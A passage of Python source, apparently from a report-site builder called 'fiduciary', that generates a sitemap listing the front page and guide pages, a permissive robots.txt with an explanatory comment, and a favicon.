    primary = data.get("primary")
    attestation = (data.get("attestations") or {}).get(primary) or {}
    return str(attestation.get("generated_at", ""))[:10]


def sitemap(data: Mapping[str, Any]) -> str:
    """The site's addresses: the front page, and each guide (1.19.0). The views behind
    ``#/`` are the same page to a crawler, so the guides are pages of their own."""
    from fiduciary.report.guides import GUIDES

    day = built_on(data)
    lastmod = f"<lastmod>{day}</lastmod>" if re.fullmatch(r"\d{4}-\d{2}-\d{2}", day) else ""
    urls = [SITE_URL, *(f"{SITE_URL}{g['slug']}/" for g in GUIDES)]
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        + "".join(f"  <url><loc>{url}</loc>{lastmod}</url>\n" for url in urls)
        + "</urlset>\n"
    )


def robots() -> str:
    """Allow every crawler, and say where the sitemap is."""
    return (
        "# Crawlers read robots.txt only at the root of a host, so this copy, under /fiduciary/,\n"
        "# is not obeyed. It says what the site wants, and where its sitemap is.\n"
        "User-agent: *\n"
        "Allow: /\n"
        "\n"
        f"Sitemap: {SITE_URL}sitemap.xml\n"
    )


def favicon() -> str:
    """Fiduciary's mark, drawn for the reader's light or dark setting."""
    return brand.standalone("fiduciary", theme="auto", size=32)
